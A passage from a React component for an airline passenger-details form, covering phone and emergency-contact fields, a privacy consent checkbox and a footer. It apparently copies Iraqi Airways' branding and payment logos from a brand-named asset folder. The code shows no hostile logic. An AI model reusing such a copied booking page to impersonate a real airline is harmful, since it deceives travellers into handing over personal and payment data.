              <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0]">
                <legend className="text-[#2E7D32] text-xs px-1">Country calling code</legend>
                <input type="text" placeholder="+964" value={ph.code} onChange={(e) => { const arr = [...extraPhones]; arr[i].code = e.target.value.replace(/[^0-9+]/g, ''); setExtraPhones(arr); }} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
              </fieldset>
              <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0]">
                <legend className="text-[#2E7D32] text-xs px-1">Phone number</legend>
                <input type="tel" placeholder="Enter a mobile phone" value={ph.number} onChange={(e) => { const arr = [...extraPhones]; arr[i].number = e.target.value.replace(/[^0-9]/g, ''); setExtraPhones(arr); }} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
              </fieldset>
            </div>
          ))}
          {/* Add another phone */}
          <div className="text-center mb-6">
            <button type="button" onClick={() => setExtraPhones([...extraPhones, {code: '+964', number: ''}])} className="bg-[#2E7D32] text-white px-6 py-2.5 rounded-full text-sm font-medium">Add another phone number</button>
          </div>
          {/* Fill emergency contact toggle */}
          <div className="flex items-center gap-3 cursor-pointer" onClick={() => setShowEmergency(!showEmergency)}>
            <div className={`w-10 h-5 rounded-full relative transition-colors ${showEmergency ? 'bg-[#4CAF50]' : 'bg-gray-400'}`}><div className={`w-4 h-4 bg-white rounded-full absolute top-0.5 transition-all ${showEmergency ? 'left-[22px]' : 'left-0.5'}`}></div></div>
            <span className="text-gray-600 text-sm">Fill emergency contact</span>
          </div>
          {/* Emergency contact fields */}
          {showEmergency && (
            <div className="mt-5 space-y-5">
              <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0]">
                <legend className="text-[#2E7D32] text-xs px-1">Emergency contact name*</legend>
                <input type="text" placeholder="Enter full name" value={emergency.firstName} onChange={(e) => { const v = e.target.value.replace(/[^a-zA-Z\s\-']/g, ''); setEmergency({...emergency, firstName: v}); }} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
              </fieldset>
              <div className="grid grid-cols-2 gap-4">
                <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0]">
                  <legend className="text-[#2E7D32] text-xs px-1">Country calling code*</legend>
                  <input type="text" placeholder="+964" value={emergency.dialCode} onChange={(e) => { const v = e.target.value.replace(/[^0-9+]/g, ''); setEmergency({...emergency, dialCode: v}); }} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
                </fieldset>
                <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0]">
                  <legend className="text-[#2E7D32] text-xs px-1">Phone number*</legend>
                  <input type="tel" placeholder="Enter a mobile phone" value={emergency.phone} onChange={(e) => { const v = e.target.value.replace(/[^0-9]/g, ''); setEmergency({...emergency, phone: v}); }} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
                </fieldset>
              </div>
            </div>
          )}
        </div>

        {/* Remember passenger information */}
        <div className="border border-gray-200 rounded-lg p-6 mb-6 bg-[#f9f9f9]">
          <div className="flex items-center gap-3">
            <div className="w-10 h-5 bg-gray-400 rounded-full relative cursor-pointer"><div className="w-4 h-4 bg-white rounded-full absolute top-0.5 left-0.5"></div></div>
            <div>
              <p className="font-bold text-gray-800">Remember passenger information</p>
              <p className="text-gray-500 text-sm">Save your personal information now, save time in future bookings.</p>
            </div>
          </div>
        </div>

        {/* Privacy policy checkbox */}
        <div className="border border-gray-200 rounded-lg p-6 mb-8">
          <label className="flex items-start gap-3 cursor-pointer">
            <input type="checkbox" className="w-5 h-5 mt-0.5 border-gray-300 rounded" />
            <span className="text-gray-700 text-sm">I understand and accept that my personal data will be processed in accordance with the applicable carrier's privacy policy <a href="#" className="text-[#2E7D32] underline">more</a></span>
          </label>
        </div>

        {/* Back + Confirm buttons - right aligned */}
        <div className="flex justify-end gap-3 mb-12">
          <button onClick={() => setLocation('/flight-search')} className="bg-[#1B5E20] text-white px-8 py-3 rounded-full text-base font-medium hover:bg-[#0D3B0F]">Back</button>
          <button onClick={handleContinue} className="bg-[#1B5E20] text-white px-8 py-3 rounded-full text-base font-medium hover:bg-[#0D3B0F]">Confirm</button>
        </div>
      </main>

      {/* Footer - same as flight search */}
      <footer className="bg-[#398017] text-white" dir="ltr">
        <div className="max-w-6xl mx-auto px-6 py-10">
          <div className="flex justify-between mb-8">
            <div><h4 className="font-bold text-lg mb-2">Plan and booking</h4><a href="/" className="text-white underline text-sm">Book trip ↗</a></div>
            <div><h4 className="font-bold text-lg mb-2">Contact us</h4><a href="/" className="text-white underline text-sm block">Contact us ↗</a><a href="/" className="text-white underline text-sm block mt-1">Iraqi airways offers ↗</a></div>
            <div><h4 className="font-bold text-lg mb-2">About us</h4><a href="/" className="text-white underline text-sm">Our fleet ↗</a></div>
          </div>
          <div className="text-center">
            <h4 className="font-bold text-lg mb-3">Secured payment</h4>
            <div className="flex justify-center gap-3 mb-2">
              <div className="bg-white rounded overflow-hidden"><img src="/iraqi_airways/americanexpress.png" alt="Amex" className="h-10" /></div>
              <div className="bg-white rounded overflow-hidden"><img src="/iraqi_airways/visa.png" alt="Visa" className="h-10" /></div>
              <div className="bg-white rounded overflow-hidden"><img src="/iraqi_airways/mastercard.png" alt="MC" className="h-10" /></div>
              <div className="bg-white rounded overflow-hidden"><img src="/iraqi_airways/paypal.png" alt="PayPal" className="h-10" /></div>
              <div className="bg-white rounded overflow-hidden"><img src="/iraqi_airways/dinersclub.png" alt="DC" className="h-10" /></div>
            </div>
            <p className="text-sm text-white/80">Credit card fees may occur.</p>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default PassengerDetails;
